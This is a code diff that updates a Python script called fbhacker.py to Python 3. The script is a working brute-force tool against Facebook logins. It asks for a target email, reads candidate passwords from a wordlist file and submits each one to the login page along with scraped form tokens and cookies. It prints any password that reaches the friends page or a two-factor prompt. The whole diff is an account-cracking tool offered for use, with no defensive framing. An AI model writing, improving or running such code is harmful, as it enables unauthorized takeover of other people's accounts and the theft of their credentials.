@@ -1,11 +1,15 @@
 
-import time
+import requests
+import threading
+# import urllib.request
+# import os
+from bs4 import BeautifulSoup
 import sys
 
-if sys.version_info[0] !=2: 
+if sys.version_info[0] !=3: 
 	print('''--------------------------------------
-	REQUIRED PYTHON 2.x
-	use: python fbhacker.py
+	REQUIRED PYTHON 3.x
+	use: python3 fbhacker.py
 --------------------------------------
 			''')
 	sys.exit()
@@ -14,41 +18,48 @@ post_url='https://www.facebook.com/login.php'
 headers = {
 	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
+payload={}
+cookie={}
 
-try:
-	import mechanize
-	import urllib2
-	browser = mechanize.Browser()
-	browser.addheaders = [('User-Agent',headers['User-Agent'])]
-	browser.set_handle_robots(False)
-except:
-	print('\n\tPlease install mechanize.\n')
-	sys.exit()
+def create_form():
+	form=dict()
+	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
+
+	data=requests.get(post_url,headers=headers)
+	for i in data.cookies:
+		cookie[i.name]=i.value
+	data=BeautifulSoup(data.text,'html.parser').form
+	if data.input['name']=='lsd':
+		form['lsd']=data.input['value']
+	return (form,cookie)
+
+def function(email,passw,i):
+	global payload,cookie
+	if i%10==1:
+		payload,cookie=create_form()
+		payload['email']=email
+	payload['pass']=passw
+	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
+	if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text:
+		open('temp','w').write(str(r.content))
+		print('\npassword is : ',passw)
+		return True
+	return False
 
 print('\n---------- Welcome To NightMare ----------\n')
 file=open('passwords.txt','r')
 
-email=str(raw_input('Enter Email/Username : ').strip())
+email=input('Enter Email/Username : ')
 
-print ("\nTarget Email ID : ",email)
-print ("\nSearching Passwords..........")
+print("\nTarget Email ID : ",email)
+print("\nSearching Passwords......")
+
+i=0
 while file:
 	passw=file.readline().strip()
-	i+=5
+	i+=1
 	if len(passw) < 6:
 		continue
-	print str(i) +" : ",passw
-	response = browser.open(post_url)
-	try:
-		if response.code == 200:
-			browser.select_form(nr=0)
-			browser.form['email'] = email
-			browser.form['pass'] = passw
-			response = browser.submit()
-			response_data = response.read()
-			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
-				print('Your password is : ',passw)
-				break
-	except:
-		print('\nSleeping for time : 5 min\n')
-		time.sleep(300)
+	print(str(i) +" : ",passw)
+	if function(email,passw,i):
+		break
